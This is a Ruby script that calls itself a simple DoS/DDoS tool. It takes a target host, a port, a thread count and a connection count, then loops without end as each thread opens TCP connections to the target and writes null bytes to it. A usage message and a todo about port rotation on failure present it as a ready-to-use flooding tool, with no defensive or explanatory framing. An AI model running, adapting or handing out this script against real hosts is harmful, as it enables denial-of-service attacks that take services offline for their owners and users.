#Simple DoS/DDoS script in ruby
#todo: add intelligent port rotation on failure
require 'socket'
include Socket::Constants

num_threads = 8
num_connections = 16

if ARGV.length < 2
    puts "Usage: #{$0} [host] [port] <threads> <connections>"
    exit
else
    t_host = ARGV[0]
    t_port = ARGV[1]
    num_threads = ARGV[2].to_i unless ARGV[2] == nil
    num_connections = ARGV[3].to_i unless ARGV[3] == nil
    while 1
        threads = Array.new(num_threads) { |index|
            Thread.new {
                (0..num_connections).each do
                    socket = Socket.new(AF_INET, SOCK_STREAM, 0)
                    sockaddr = Socket.pack_sockaddr_in(t_port, t_host)
                    socket.connect(sockaddr)
                    socket.write("\0")
                end
                puts "[thread #{index} | #{num_connections} null packets sent]"
            }
        }
        threads.each do |thread|
            thread.join
        end
        puts "[all threads complete, restarting]"
    end
end